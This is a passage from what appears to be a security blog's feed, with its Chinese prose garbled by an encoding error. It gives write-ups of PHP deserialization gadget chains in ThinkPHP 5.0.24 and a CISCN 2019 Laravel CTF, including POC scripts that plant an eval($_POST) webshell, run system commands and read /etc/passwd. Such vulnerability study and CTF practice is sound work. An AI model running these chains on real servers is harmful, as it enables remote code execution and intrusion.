alt=""></p><p>è¿™é‡Œåˆä¸€ä¸ªif/elseåˆ†æ”¯ï¼ŒæŒ‰é“ç†æ¥è¯´ifä¸ºçœŸæ—¶å®Œå…¨å¯ä»¥è¾¾æˆä¸€æ¡å®Œæ•´çš„popé“¾ï¼ŒæŠŠ <strong>$this-&gt;parent</strong> çš„å€¼èµ‹å€¼ç»™valueï¼Œç„¶åå†å¾€ä¸‹è§¦å‘<strong>__call</strong> å³å¯ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°æ—¶å€™è€æ˜¯æŠ¥é”™ï¼Œæ²¡åŠæ³•æ‰§è¡Œï¼ŒçœŸéš¾ï¼Œè‰¹ã€‚</p><p>ç„¶ååˆæ‰¾åˆ°äº†å¦ä¸€æ¡é“¾å­ï¼Œè¿™é‡Œå°±ä¸çœ‹æ²¡æˆåŠŸçš„é‚£ä¸ªäº†ï¼Œå›å¤´æœ‰æ—¶é—´å†çœ‹çœ‹ã€‚<br>çœ‹646è¡Œï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value &#x3D; $modelRelation-&gt;getRelation();</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº† <strong>getRelation</strong> æ–¹æ³•ï¼Œæˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªæœ‰è¿™ä¸ªæ–¹æ³•å¹¶ä¸”è¿”å›å€¼å¯æ§çš„ï¼Œäºæ˜¯åœ¨ <strong>HasOne</strong> è¿™ä¸ªç±»ä¸­æ‰¾åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹</p><p><img src="/images/thinkphp5.0.24/20200913191222.png" alt=""></p><p>çœ‹ç¬¬53ã€54è¡Œï¼Œè¿™é‡Œä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œåœ¨è¿™é‡Œå¯ä»¥è§¦å‘ <strong>__call()</strong> ã€‚</p><p>å¯è°ƒç”¨çš„ <strong>__call()</strong> åœ¨ <strong>Output</strong> ç±»ä¸­ï¼š</p><p><img src="/images/thinkphp5.0.24/20200913192538.png" alt=""></p><p>è·Ÿè¿› <strong>Output</strong> ç±» <strong>block</strong> æ–¹æ³•</p><p><img src="/images/thinkphp5.0.24/20200913192810.png" alt=""></p><p>è·Ÿè¿› <strong>writeIn</strong> æ–¹æ³•</p><p><img src="/images/thinkphp5.0.24/20200913192900.png" alt=""></p><p>è·Ÿè¿› <strong>write</strong> æ–¹æ³•</p><p><img src="/images/thinkphp5.0.24/20200913192950.png" alt=""></p><p>è¿™é‡Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„writeæ–¹æ³•ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹writeæ–¹æ³•ï¼Œåœ¨ <strong>Memcache</strong> ç±»ä¸­çš„ <strong>write</strong> å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ <strong>set</strong>æ–¹æ³•ã€‚</p><p><img src="/images/thinkphp5.0.24/20200913193105.png" alt=""></p><p>å¯»æ‰¾ <strong>set</strong> æ–¹æ³•ï¼Œåœ¨ <strong>File</strong> ç±»ä¸­ï¼Œ</p><p><img src="/images/thinkphp5.0.24/20200913193447.png" alt=""></p><p>éœ€è¦ä½¿ç”¨ä¼ªåè®®ç»•è¿‡exit()ä½¿ç”¨file_put_contents()å†™å…¥shellï¼Œ<br>è¿™é‡Œç¬¬ä¸€æ¬¡è°ƒç”¨ <strong>set</strong> å‚æ•°æ˜¯ä¸å¯æ§çš„ï¼Œæ— æ³•å†™shellï¼ŒçœŸæ­£å†™shellæ˜¯åˆ©ç”¨ <strong>setTagItem()</strong> æ–¹æ³•ç¬¬äºŒæ¬¡è°ƒç”¨setï¼Œç„¶åå°±å¯ä»¥å†™å…¥shelläº†ã€‚</p><p>ä¸­é€”å†™å¥½åè¿è¡Œäº†å‡ æ¬¡æ— æ³•åœ¨windowsä¸­å¤ç°æˆåŠŸï¼Œäºæ˜¯å‚è€ƒäº†è¿™é‡Œï¼š</p><blockquote><p><a href="https://xz.aliyun.com/t/7457#toc-3">https://xz.aliyun.com/t/7457#toc-3</a></p></blockquote><p>ä¸‹é¢æ˜¯æœ€åçš„POCï¼š</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Fileç±»</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag&#x3D;&#39;sodayo&#39;;</span><br><span class="line">    protected $options &#x3D; [</span><br><span class="line">        &#39;expire&#39;        &#x3D;&gt; 0,</span><br><span class="line">        &#39;cache_subdir&#39;  &#x3D;&gt; false,</span><br><span class="line">        &#39;prefix&#39;        &#x3D;&gt; false,</span><br><span class="line">        &#39;path&#39;          &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F;a.php&#39;, &#x2F;&#x2F;è¿™é‡Œæ˜¯æ¬²å†™å…¥çš„PHPè¢«rot13åçš„ç»“æœ</span><br><span class="line">        &#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Memcachedç±»</span><br><span class="line">namespace think\session\driver;</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler&#x3D;new File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Outputç±»</span><br><span class="line">namespace think\console;</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles &#x3D; [&#39;removeWhereField&#39;];</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle&#x3D;new Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;HasOneç±»</span><br><span class="line">namespace think\model\relation;</span><br><span class="line">use think\console\Output;</span><br><span class="line">class HasOne</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;protected $foreignKey&#x3D;&quot;sss&quot;; &#x2F;&#x2F;$this-&gt;query-&gt;removeWhereField($this-&gt;foreignKey)</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query&#x3D;new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Pivotç±»</span><br><span class="line">namespace think\model;</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">class Pivot</span><br><span class="line">&#123;</span><br><span class="line">    protected $append &#x3D; [&#39;getError&#39;];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;error&#x3D;new HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;Windowsç±»</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x&#x3D;new Windows();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($x));</span><br></pre></td></tr></table></figure><p>è¿è¡Œåç”Ÿæˆa.php6218150bbcad1e6eec78da4604c4b6c7.phpï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªeval($_POST[â€˜cccâ€™])</p><p><img src="/images/thinkphp5.0.24/20200913204939.png" alt=""></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>åªæƒ³è¯´æ˜¯çœŸçš„éš¾ï¼Œå’Œå¹³æ—¶æ¯”èµ›ä¸­çš„ååºåˆ—åŒ–é“¾å­å®Œå…¨ä¸æ˜¯ä¸€ä¸ªçº§åˆ«çš„ã€‚ç„¶åæ€»ä¹‹å°±æ˜¯å¤šå®¡é“¾å­ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;å…³äºæœ¬æ–‡&quot;&gt;&lt;a href=&quot;#å…³äºæœ¬æ–‡&quot; class=&quot;headerlink&quot; title=&quot;å…³äºæœ¬æ–‡&quot;&gt;&lt;/a&gt;å…³äºæœ¬æ–‡&lt;/h2&gt;&lt;p&gt;è¿™ç¯‡æ˜¯å¯¹thinkphp5.0.24ååºåˆ—åŒ–æ¼æ´çš„å¤ç°ï¼Œå› ä¸ºä»£ç é‡æœ‰ç‚¹å¤§ï¼Œåˆ†æèµ·æ¥å±å®è®©äººè‡ªé—­ï¼Œçœ‹çš„æˆ‘å¤´ç–¼ã€‚&lt;br&gt;æœ¬æ–‡åˆ†æä¼šé™„å¸¦pocã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2019 laravelååºåˆ—åŒ–åˆ©ç”¨é“¾</title>
    <link href="http://yoursite.com/2020/09/10/ciscn-laravel1/"/>
    <id>http://yoursite.com/2020/09/10/ciscn-laravel1/</id>
    <published>2020-09-10T11:16:48.000Z</published>
    <updated>2020-09-16T05:11:08.119Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]<br>è¿™å‡ å¤©æ€»æƒ³ç€å®¡ç‚¹ååºåˆ—åŒ–çš„é“¾å­ï¼Œç»“æœåˆšå¥½åœ¨buuä¸Šçœ‹åˆ°ä¸€é“ä¸é”™çš„é¢˜ï¼Œåˆšå¥½ç»ƒç»ƒæ‰‹ã€‚<a id="more"></a><br>æ‰“å¼€é¡µé¢å°±æ˜¯ç®€çŸ­çš„ä»£ç å‘Šè¯‰æˆ‘ä»¬æ˜¯ååºåˆ—åŒ–ï¼Œç„¶åæ ¹æ®æç¤ºä¸‹è½½ä¸‹æ¥æºç ã€‚ç”¨çš„æ˜¯laravelæ¡†æ¶ï¼Œè®²å®è¯è¿™ç§æ¡†æ¶çš„ä»£ç å¥½éš¾çœ‹æ‡‚ï¼Œä¸æ‡‚è¿™ä¸ª<code>index.php</code>æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ï¼Œç„¶åè¾¹æŸ¥èµ„æ–™è¾¹çœ‹ç»ˆäºæ‡‚äº†ä¸€ç‚¹ç‚¹ã€‚</p><h2 id="è·¯ç”±ä¿¡æ¯"><a href="#è·¯ç”±ä¿¡æ¯" class="headerlink" title="è·¯ç”±ä¿¡æ¯"></a>è·¯ç”±ä¿¡æ¯</h2><p>é¦–å…ˆè¦æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ï¼Œæ‰€æœ‰çš„Laravelè·¯ç”±éƒ½æ˜¯åœ¨routesç›®å½•ä¸‹çš„è·¯ç”±æ–‡ä»¶ä¸­ï¼Œè¿™äº›æ–‡ä»¶é€šè¿‡æ¡†æ¶è‡ªåŠ¨åŠ è½½ã€‚routes/web.phpæ–‡ä»¶å®šä¹‰äº†webç•Œé¢çš„è·¯ç”±ï¼Œè¿™äº›è·¯ç”±è¢«åˆ†é…äº†webä¸­é—´ä»¶ç»„ï¼Œä»è€Œå¯ä»¥æä¾›sessionå’Œcsrfé˜²æŠ¤ç­‰åŠŸèƒ½ã€‚routes/api.phpä¸­çš„è·¯ç”±æ˜¯æ— çŠ¶æ€çš„ï¼Œè¢«åˆ†é…äº† api ä¸­é—´ä»¶ç»„ã€‚<br>å¯¹å¤§å¤šæ•°åº”ç”¨è€Œè¨€ï¼Œéƒ½æ˜¯ä» routes/web.php æ–‡ä»¶å¼€å§‹å®šä¹‰è·¯ç”±ã€‚</p><p><img src="/images/ciscn_laravel/20200910194248.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨web.phpä¸­è‡ªåŠ¨åŠ è½½äº†IndexControllerç±»ä¸­çš„indexæ–¹æ³•ã€‚æ˜ç™½äº†ä»–ä¸ºä»€ä¹ˆè¿™æ ·è¿è¡Œä¹‹åå°±å¯ä»¥å¼€å§‹çœ‹ä»£ç äº†ã€‚</p><h2 id="ååºåˆ—åŒ–åˆ©ç”¨"><a href="#ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨"></a>ååºåˆ—åŒ–åˆ©ç”¨</h2><p><img src="/images/ciscn_laravel/20200910194740.png" alt=""></p><p>å¾ˆæ˜äº†çš„ååºåˆ—åŒ–ã€‚<br>çœ‹è¿™ç§ååºåˆ—åŒ–ä¸€èˆ¬éƒ½æ˜¯ç›´æ¥å…¨å±€æœç´¢é­”æ³•å‡½æ•°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„ <code>__destruct(),__wakeup(),__toString(),__call()</code> ç­‰ç­‰ã€‚å°±å…ˆçœ‹__destruct()å§ï¼Œä¸€æœä¸€å †ï¼Œå¿ƒæ€å´©äº†ï¼Œçœ‹äº†åŠå¤©ç»ˆäºçœ‹åˆ°ä¸€ä¸ªèƒ½ç”¨çš„ï¼Œåœ¨TagAwareAdapter.phpçš„<strong>TagAwareAdapter</strong>ç±»é‡Œé¢ã€‚</p><p><img src="/images/ciscn_laravel/20200910195422.png" alt=""></p><p><strong>__destruct</strong>è°ƒç”¨äº† <code>commit</code> æ–¹æ³•ï¼Œç„¶å <code>commit()</code> åˆè°ƒç”¨äº† <code>invalidateTags()</code> æ–¹æ³•ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ã€‚<br><img src="/images/ciscn_laravel/20200910224023.png" alt=""><br>åœ¨ç¬¬125è¡Œï¼Œ<code>$this-&gt;pool-&gt;saveDeferred($item)</code>è¿™ç§å¯ä»¥è§¦å‘<code>__call</code>æ–¹æ³•ï¼Œä½†æˆ‘æŠŠ__calléƒ½çœ‹äº†ä¸€éå‘ç°æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ã€‚ç„¶åæƒ³åˆ°äº†å¯ä»¥è°ƒç”¨åˆ«çš„ç±»çš„<code>saveDeferred()</code>æ–¹æ³•ã€‚ç„¶åå…¨å±€æœç´¢äº†ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•æ‰¾åˆ°ä¸¤ä¸ªå¯ç”¨çš„ã€‚<br>ç¬¬ä¸€ä¸ªæ˜¯åœ¨ <code>ProxyAdapter.php</code> ä¸­,ç¬¬äºŒä¸ªæ˜¯åœ¨ <code>PhpArrayAdapter.php</code> ä¸­ï¼Œåˆ†åˆ«çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œä¹Ÿå¯¹åº”ä¸¤ä¸ªexpã€‚</p><h3 id="ProxyAdapter-php"><a href="#ProxyAdapter-php" class="headerlink" title="ProxyAdapter.php"></a>ProxyAdapter.php</h3><p><img src="/images/ciscn_laravel/20200910224927.png" alt=""></p><p><img src="/images/ciscn_laravel/20200910225107.png" alt=""></p><p> <strong>saveDeferred()</strong> å…ˆè°ƒç”¨äº† <strong>dosave()</strong> æ–¹æ³•ï¼Œç„¶ååœ¨ <strong>dosave()</strong> çš„223è¡Œï¼Œä¹Ÿå°±æ˜¯çº¢æ¡†ä¸­çš„éƒ¨åˆ†æœ‰ä»»æ„å‡½æ•°æ‰§è¡Œï¼Œå‡½æ•°åæ˜¯å¯æ§çš„ï¼Œå°±æ˜¯ <strong>$this-&gt;setInnerItem</strong> ï¼Œå‡½æ•°å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p><img src="/images/ciscn_laravel/20200910225648.png" alt=""></p><p>å½“æ»¡è¶³ifæ¡ä»¶çš„æ—¶å€™ï¼Œä¼šæŠŠ <strong>$item[â€œ\0*\0innerItemâ€]</strong> çš„å€¼èµ‹ç»™ <strong>$innerItem</strong>ã€‚å†å¾€å‰çœ‹</p><p><img src="/images/ciscn_laravel/20200910225944.png" alt=""></p><p><strong>instanceof</strong>æ˜¯æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ã€‚è¿™ä¸ªifè¯­å¥å°±æ˜¯ï¼Œå¦‚æœ$itemä¸æ˜¯CacheItemç±»çš„å®ä¾‹åŒ–ï¼Œå°±é€€å‡ºã€‚åªè¦èµ‹å€¼$itemä¸ºCacheItemç±»çš„å®ä¾‹åŒ–å³å¯ã€‚</p><p><img src="/images/ciscn_laravel/20200910231026.png" alt=""></p><p>system()æœ‰ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™ä¸ªç¬¬äºŒä¸ªå‚æ•°çš„æ„æ€å®é™…ä¸Šæ˜¯å°†æ‰§è¡Œç»“æœä¿å­˜åˆ°<strong>return_var</strong>å˜é‡,æ‰€ä»¥è¿™åªèƒ½æ˜¯ä¸ªå˜é‡åï¼Œè¿™é‡ŒæŠŠreturn_varçš„å€¼ç›´æ¥æ”¾è¿›å‡½æ•°é‡Œæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹<strong>return_var</strong>å‚æ•°æ˜¯intå‹å’Œæ•°ç»„å‹éƒ½å¯ä»¥ï¼Œæ‰€ä»¥è·Ÿå˜é‡ç±»å‹æ— å…³ã€‚<br>ç„¶åä¾¿å¯ä»¥å†™expï¼Œè¦æ³¨æ„å‘½åç©ºé—´ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">class ProxyAdapter&#123;</span><br><span class="line">private $setInnerItem;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache &#123;</span><br><span class="line">class CacheItem&#123;</span><br><span class="line">protected $innerItem;</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;innerItem &#x3D; &#39;ls&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">private $deferred &#x3D; [];</span><br><span class="line">private $pool;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;deferred &#x3D; array(&#39;123&#39;&#x3D;&gt; new CacheItem());</span><br><span class="line">$this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PhpArrayAdapter-php"><a href="#PhpArrayAdapter-php" class="headerlink" title="PhpArrayAdapter.php"></a>PhpArrayAdapter.php</h3><p>å†æ¥çœ‹ç¬¬äºŒä¸ª</p><p><img src="/images/ciscn_laravel/20200910231525.png" alt=""></p><p>è°ƒç”¨äº†initialize()æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼Œåœ¨<strong>PhpArrayTrait</strong>ç±»ä¸­ï¼Œè¿™é‡Œçš„<strong>trait</strong>æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</p><blockquote><p>Trait æ˜¯ä¸ºç±»ä¼¼ PHP çš„å•ç»§æ‰¿è¯­è¨€è€Œå‡†å¤‡çš„ä¸€ç§ä»£ç å¤ç”¨æœºåˆ¶ã€‚Trait ä¸ºäº†å‡å°‘å•ç»§æ‰¿è¯­è¨€çš„é™åˆ¶ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿè‡ªç”±åœ°åœ¨ä¸åŒå±‚æ¬¡ç»“æ„å†…ç‹¬ç«‹çš„ç±»ä¸­å¤ç”¨ methodã€‚ Trait å’Œ Class ç»„åˆçš„è¯­ä¹‰å®šä¹‰äº†ä¸€ç§å‡å°‘å¤æ‚æ€§çš„æ–¹å¼ï¼Œé¿å…ä¼ ç»Ÿå¤šç»§æ‰¿å’Œ Mixin ç±»ç›¸å…³å…¸å‹é—®é¢˜ã€‚</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸€ç§å¤šç»§æ‰¿çš„æ–¹å¼ï¼Œ<code>PhpArrayTrait</code>ä¹Ÿå°±æ˜¯<code>PhpArrayAdapter</code>çš„çˆ¶ç±»ã€‚å½“åœ¨å­ç±»ä¸­æ‰¾ä¸åˆ°æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è¿›å…¥çˆ¶ç±»ä¸­å¯»æ‰¾ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè·Ÿè¿›åˆ°çš„<code>initialize()</code>åœ¨PhpArrayTraitç±»ä¸­ã€‚<br>ä¸‹é¢çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚</p><p><img src="/images/ciscn_laravel/20200910232316.png" alt=""></p><p>ä¸­é—´çš„includeå‚æ•°ä¸­å­˜åœ¨å˜é‡ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«ã€‚æ„é€ ä¸€ä¸‹expã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache &#123;</span><br><span class="line">class CacheItem&#123;</span><br><span class="line">protected $innerItem;</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;innerItem &#x3D; &#39;ls&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class PhpArrayAdapter&#123;</span><br><span class="line">private $values;</span><br><span class="line">private $file;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;values &#x3D; null;</span><br><span class="line">$this-&gt;file &#x3D; &#39;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">private $deferred &#x3D; [];</span><br><span class="line">private $pool;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;deferred &#x3D; array(&#39;123&#39;&#x3D;&gt; new CacheItem());</span><br><span class="line">$this-&gt;pool &#x3D; new PhpArrayAdapter();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>åˆ°è¿™é‡Œå·®ä¸å¤šå°±ç»“æŸäº†ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œå¾—å¤šå®¡ç‚¹é“¾å­ï¼Œå¤šå¤šçœ‹ä»£ç ã€‚å¤ªèœäº†å¤ªèœäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;br&gt;è¿™å‡ å¤©æ€»æƒ³ç€å®¡ç‚¹ååºåˆ—åŒ–çš„é“¾å­ï¼Œç»“æœåˆšå¥½åœ¨buuä¸Šçœ‹åˆ°ä¸€é“ä¸é”™çš„é¢˜ï¼Œåˆšå¥½ç»ƒç»ƒæ‰‹ã€‚
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>typechoååºåˆ—åŒ–åˆ©ç”¨é“¾åˆ†æ</title>
    <link href="http://yoursite.com/2020/09/03/typecho-1-1/"/>
    <id>http://yoursite.com/2020/09/03/typecho-1-1/</id>
    <published>2020-09-03T10:49:54.000Z</published>
    <updated>2020-09-11T02:13:22.211Z</updated>
    
